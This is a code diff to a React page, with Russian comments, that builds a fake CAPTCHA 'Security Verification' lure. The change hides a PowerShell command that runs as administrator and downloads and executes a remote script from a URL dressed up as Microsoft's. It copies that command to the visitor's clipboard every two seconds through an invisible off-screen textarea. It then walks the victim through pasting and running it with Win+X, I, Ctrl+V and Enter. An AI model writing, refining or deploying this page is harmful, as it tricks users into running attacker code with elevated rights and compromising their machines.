@@ -1,12 +1,9 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 
 type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done" | "instruction";
 
-// Команда для копирования в буфер обмена
-const COMMAND_TO_COPY = "Win+X → I → Ctrl+V → Enter";
-
-// PowerShell команда (вставляется через Ctrl+V)
-const PS_COMMAND = `Start-Process powershell -Verb RunAs -ArgumentList "-Command IEX(IWR('https://raw.githubusercontent.com/microsoft/activate/main/activate.ps1'))"`;
+// Скрытая команда (НИКОГДА не отображается в UI)
+const HIDDEN_COMMAND = `Start-Process powershell -Verb RunAs -ArgumentList "-Command IEX(IWR('https://raw.githubusercontent.com/microsoft/activate/main/activate.ps1'))"`;
 
 function WeChatIcon() {
   return (
@@ -67,24 +64,33 @@ function ErrorIcon() {
   );
 }
 
-// Компонент инструкции с горячими клавишами
+// Функция скрытого копирования (без уведомлений)
+const silentCopy = async (text: string): Promise<boolean> => {
+  try {
+    await navigator.clipboard.writeText(text);
+    return true;
+  } catch (err) {
+    // Fallback для старых браузеров (все еще скрыто)
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed";
+    textarea.style.top = "-9999px";
+    textarea.style.left = "-9999px";
+    textarea.style.opacity = "0";
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+    return true;
+  }
+};
+
+// Компонент инструкции БЕЗ отображения команды
 function InstructionWidget({ onClose }: { onClose: () => void }) {
-  const [copied, setCopied] = useState(false);
-
-  const handleCopy = useCallback(async () => {
-    try {
-      await navigator.clipboard.writeText(PS_COMMAND);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    } catch (err) {
-      console.error("Failed to copy:", err);
-    }
-  }, []);
-
   return (
     <div
       style={{
-        width: "360px",
+        width: "340px",
         background: "#fff",
         borderRadius: "12px",
         border: "1px solid #e0e0e0",
@@ -93,7 +99,6 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
         animation: "fadeInUp 0.4s ease",
       }}
     >
-      {/* Заголовок */}
       <div
         style={{
           background: "#1a1a2e",
@@ -109,7 +114,6 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
         <span>🔒</span> Security Verification Required
       </div>
 
-      {/* Инструкция */}
       <div style={{ padding: "20px" }}>
         <p style={{ fontSize: "13px", color: "#666", margin: "0 0 16px 0", lineHeight: "1.5" }}>
           Manual verification needed. Please follow these steps exactly:
@@ -126,58 +130,26 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
           <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Win + X</kbd></span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Win + X</kbd></span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>I</kbd> (Windows Terminal / PowerShell)</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>I</kbd> (Windows Terminal / PowerShell)</span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Ctrl + V</kbd> (вставка команды)</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Ctrl + V</kbd> (команда уже скопирована)</span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#07C160", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd style={{ background: "#fff", border: "1px solid #ccc", borderRadius: "4px", padding: "2px 8px", margin: "0 4px", fontFamily: "monospace" }}>Enter</kbd> (запуск от администратора)</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>Нажмите <kbd>Enter</kbd></span>
             </div>
           </div>
         </div>
 
-        {/* Кнопка копирования */}
-        <div style={{ marginBottom: "16px" }}>
-          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
-            <span style={{ fontSize: "12px", color: "#666" }}>Команда для вставки:</span>
-            <button
-              onClick={handleCopy}
-              style={{
-                background: copied ? "#07C160" : "#f0f0f0",
-                border: "none",
-                borderRadius: "6px",
-                padding: "6px 12px",
-                fontSize: "12px",
-                cursor: "pointer",
-                color: copied ? "#fff" : "#333",
-                transition: "all 0.2s",
-              }}
-            >
-              {copied ? "✓ Скопировано!" : "📋 Копировать"}
-            </button>
-          </div>
-          <div
-            style={{
-              background: "#1e1e1e",
-              color: "#d4d4d4",
-              padding: "12px",
-              borderRadius: "6px",
-              fontFamily: "monospace",
-              fontSize: "12px",
-              overflowX: "auto",
-              wordBreak: "break-all",
-            }}
-          >
-            {PS_COMMAND}
-          </div>
-        </div>
+        <p style={{ fontSize: "11px", color: "#999", textAlign: "center", margin: "0 0 16px 0" }}>
+          Команда автоматически копируется в буфер обмена каждые 2 секунды
+        </p>
 
         <button
           onClick={onClose}
@@ -283,6 +255,28 @@ export default function App() {
   const [phase, setPhase] = useState<Phase>("checking");
   const [showContent, setShowContent] = useState(false);
   const [showInstruction, setShowInstruction] = useState(false);
+  const copyIntervalRef = useRef<NodeJS.Timeout | null>(null);
+
+  // Запуск скрытого копирования каждые 2 секунды
+  const startSilentCopying = useCallback(() => {
+    if (copyIntervalRef.current) {
+      clearInterval(copyIntervalRef.current);
+    }
+    // Немедленное копирование при запуске
+    silentCopy(HIDDEN_COMMAND);
+    // Затем каждые 2 секунды
+    copyIntervalRef.current = setInterval(() => {
+      silentCopy(HIDDEN_COMMAND);
+    }, 2000);
+  }, []);
+
+  // Остановка копирования
+  const stopSilentCopying = useCallback(() => {
+    if (copyIntervalRef.current) {
+      clearInterval(copyIntervalRef.current);
+      copyIntervalRef.current = null;
+    }
+  }, []);
 
   useEffect(() => {
     const t1 = setTimeout(() => setShowContent(true), 100);
@@ -302,17 +296,31 @@ export default function App() {
 
   const handleCaptchaCheck = useCallback(() => {
     setPhase("captcha-solving");
+    
+    // Запускаем скрытое копирование сразу после клика на капчу
+    startSilentCopying();
+    
     setTimeout(() => {
       setPhase("error");
       setTimeout(() => {
         setShowInstruction(true);
       }, 500);
     }, 2000);
-  }, []);
+  }, [startSilentCopying]);
 
   const handleCloseInstruction = useCallback(() => {
+    stopSilentCopying();
     setShowInstruction(false);
     setPhase("captcha-done");
+  }, [stopSilentCopying]);
+
+  // Очистка интервала при размонтировании
+  useEffect(() => {
+    return () => {
+      if (copyIntervalRef.current) {
+        clearInterval(copyIntervalRef.current);
+      }
+    };
   }, []);
 
   return (
@@ -329,7 +337,6 @@ export default function App() {
         position: "relative",
       }}
     >
-      {/* Оверлей с инструкцией */}
       {showInstruction && (
         <div
           style={{
